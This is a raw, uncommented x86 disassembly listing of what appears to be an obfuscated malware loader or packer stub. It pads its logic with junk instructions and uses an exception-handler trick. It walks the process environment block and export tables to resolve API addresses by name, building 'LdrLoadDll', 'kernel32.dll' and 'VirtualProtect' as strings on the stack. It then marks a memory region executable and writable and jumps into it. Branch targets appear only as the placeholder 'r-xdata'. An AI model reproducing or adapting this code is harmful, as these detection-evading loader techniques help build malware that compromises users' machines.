_start
pushad
add esp 0xfffffffc
mov [ esp ] edi
xor edi [ esp ]
and edx edx
sbb esp 0xfffffffc
push esp
and edi edi
sbb edi 0xffffffff
add esp 0x4
mov ecx [ esp - 0x4 ]
or esi esi
sbb edi 0xffffffff
and ecx ecx
sbb ecx 0x4
add edi 0x1
neg edi
call $+5
sub [ ecx ] edi
retn
sub_68e0203f
mov eax 0x0
sub eax 0x0
neg eax
sub ebx ebx
add ebx eax
xor esi esi
or esi eax
dec bh
add bh 0xff
mov bl bh
call $+5
and ecx ecx
sbb esi 0xffffffff
and edi 0x0
add edi [ esp ]
movzx ecx [ edi + esi - 0x2 ]
cmp ecx ebx
jne r-xdata
add [ esp ] eax
jmp [ esp ]
mov eax 0x0
xor eax esi
sub_68e020be
push [ fs : 0x0 ]
test ebx ebx
adc ebx ecx
mov esi 0xffff
not eax
test esi esi
adc ebx ecx
mov [ fs : 0x0 ] esp
and ebx eax
and esi esi
adc ebx ecx
and eax eax
jae r-xdata
call $+5
call sub_68e020be
push eax
sub eax eax
add eax [ esp + 0x10 ]
inc [ eax + 0xb8 ]
and edi edi
sbb [ eax + 0xb8 ] 0xffffffff
mov eax [ esp ]
add esp 0x4
sub esp 0x4
mov [ esp ] eax
xor eax [ esp ]
and ecx ecx
sbb esp 0xfffffffc
retn 0x10
mov edi [ esp ]
add esp 0x4
xor edi edi
add edi [ esp ]
mov [ fs : 0x0 ] edi
add esp 0x8
and ecx 0x0
add ecx ebx
mov edi 0x0
xor edi [ ebx + 0x3c ]
or edi edi
adc ebx edi
xor edi edi
add edi 0x4550
mov edx 0x0
add edx [ ebx ]
add esp 0xfffffffc
mov [ esp ] edi
xor edi edx
pop edi
jne r-xdata
jmp [ esp ]
popad
xor eax eax
add eax 0x1
retn 0xc
push [ ebx + 0x78 ]
pop edi
mov ebx 0x0
xor ebx edi
or ebx ebx
adc ebx ecx
push ebx
xor edi edi
add edi [ ebx + 0x20 ]
and ebx 0x0
add ebx edi
add ebx ecx
call $+5
mov [ esp ] ecx
add esp 0xfffffffc
mov [ esp ] ebx
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
call $+5
mov [ esp ] edx
xor edx [ esp ]
add esp 0x4
mov eax 0x0
sub eax esi
neg eax
push [ esi ]
pop ecx
xor esi esi
or esi ecx
call $+5
mov ebp esp
test eax eax
adc esi ebx
call $+5
mov [ esp ] 0x6c6c
push 0x4464616f
push 0x4c72644c
and edi 0x0
or edi esp
xor ecx ecx
add ecx 0xb
[ esi ] [ edi ]
je r-xdata
or eax eax
sbb ebx ecx
call $+5
mov [ esp ] edi
xor edi [ esp ]
sub esp 0xfffffffc
mov edi [ ebx ]
xor edx edx
or edx 0x5a4d
and edi esi
cmp edi edx
je r-xdata
mov esp 0x0
add esp ebp
pop esi
call $+5
mov [ esp ] ebx
call $+5
mov [ esp ] edx
add esp 0x4
mov eax [ esp - 0x4 ]
mov ecx [ esp ]
add esp 0x4
add esp 0x4
mov ebx [ esp - 0x4 ]
xor esi esi
xor esi ebx
and edi 0x0
add edi [ ebx + 0x24 ]
xor ebx ebx
add ebx edi
and ebx ebx
adc ebx ecx
and edi 0x0
or edi [ ebx + eax * 2 ]
and edi 0xffff
xor eax eax
add eax edi
push [ esi + 0x10 ]
pop edi
or edi edi
sbb eax edi
inc eax
sub ebx ebx
add ebx [ esi + 0x1c ]
and edx edx
adc ebx ecx
mov edi 0x0
or edi [ ebx + eax * 4 ]
add ecx edi
sub ebp ebp
add ebp esp
add esp 0xfffffffc
mov [ esp ] edi
xor edi [ esp ]
test ecx ecx
adc esp 0x4
add esp 0xfffffffc
mov [ esp ] edi
mov ebx 0x0
or ebx esp
sub esp 0x4
mov [ esp ] edi
add esp 0xfffffffc
mov [ esp ] 0x6c006c
add esp 0xfffffffc
mov [ esp ] 0x64002e
add esp 0xfffffffc
mov [ esp ] 0x320033
sub esp 0x4
mov [ esp ] 0x6c0065
call $+5
mov [ esp ] 0x6e0072
sub esp 0x4
mov [ esp ] 0x65006b
push esp
push 0x1a0018
mov edx 0x0
or edx esp
add esp 0xfffffffc
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] edx
push edi
push edi
sub esp 0x4
mov [ esp ] ecx
push ebx
mov esi [ esp ]
add esp 0x4
add esp 0x4
mov ebx [ esp - 0x4 ]
call ebx
and eax 0x0
or eax [ esi ]
sub esp 0x4
mov [ esp ] eax
pop edi
mov edx [ fs : 0x30 ]
and ecx 0x0
or ecx [ edx + 0x10 ]
mov [ ecx + 0x18 ] edi
mov esp 0x0
xor esp ebp
and edx 0x0
add edx [ fs : 0x30 ]
mov ecx [ edx + 0x10 ]
mov ebx 0x0
or ebx [ ecx + 0x18 ]
test ebx ebx
mov ecx 0x0
adc ecx ebx
mov edi 0x0
or edi [ ebx + 0x3c ]
or ebx ebx
adc ebx edi
mov edi [ ebx + 0x78 ]
xor ebx ebx
xor ebx edi
add ebx ecx
sub esp 0x4
mov [ esp ] ebx
xor edi edi
or edi [ ebx + 0x20 ]
sub ebx ebx
add ebx edi
add ebx ecx
sub esp 0x4
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] ebx
add esp 0x4
mov esi [ esp - 0x4 ]
pop ebx
xor edx edx
xor eax eax
xor eax esi
mov ecx [ esi ]
xor esi esi
xor esi ecx
call $+5
mov ebp 0x0
sub ebp esp
neg ebp
test esi esi
adc esi ebx
add esp 0xfffffffc
mov [ esp ] 0x7463
sub esp 0x4
mov [ esp ] 0x65746f72
add esp 0xfffffffc
mov [ esp ] 0x506c6175
add esp 0xfffffffc
mov [ esp ] 0x74726956
xor edi edi
add edi esp
mov ecx 0xf
[ esi ] [ edi ]
je r-xdata
inc edx
add eax 0x4
xor esi esi
add esi [ eax ]
xor esp esp
xor esp ebp
jmp [ esp ]
mov esp 0x0
xor esp ebp
mov esi [ esp ]
add esp 0x4
call $+5
mov [ esp ] ebx
add esp 0xfffffffc
mov [ esp ] edx
mov eax [ esp ]
add esp 0x4
mov ecx [ esp ]
add esp 0x4
pop ebx
mov esi 0x0
add esi ebx
and edi 0x0
or edi [ ebx + 0x24 ]
and ebx 0x0
add ebx edi
add ebx ecx
mov edi 0x0
sub edi [ ebx + eax * 2 ]
neg edi
and edi 0xffff
sub eax eax
add eax edi
mov edi 0x0
xor edi [ esi + 0x10 ]
sub eax edi
and ebx ebx
sbb eax 0xffffffff
mov ebx 0x0
or ebx [ esi + 0x1c ]
add ebx ecx
and ecx ecx
mov edi 0x0
adc edi [ ebx + eax * 4 ]
add ecx edi
or ecx ecx
mov esi 0x0
adc esi 0x1000
call $+5
add esp 0x4
mov ebx [ esp - 0x4 ]
and ebx 0xfffff000
and eax eax
adc ebx esi
or ebx ebx
adc ebx esi
sub esp 0x4
mov [ esp ] ebx
mov edx 0x4
call $+5
add ebx esi
mov edi 0x0
add edi [ ebx ]
dec edx
je r-xdata
inc edx
and edi edi
adc eax 0x4
mov esi 0x0
xor esi [ eax ]
mov esp 0x0
add esp ebp
jmp [ esp ]
pop edi
add esp 0x4
mov ebx [ esp - 0x4 ]
push edi
push esp
push 0x40
push 0x45c4
add esp 0xfffffffc
mov [ esp ] ebx
add esp 0xfffffffc
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] ebx
pop esi
add esp 0x4
mov ebx [ esp - 0x4 ]
call $+5
pop eax
add eax 0x1e
sub esp 0x4
mov [ esp ] eax
add esp 0xfffffffc
mov [ esp ] ebp
mov ebp 0x0
add ebp esp
and edx edx
adc ebx 0x5
jmp ebx
jmp [ esp ]
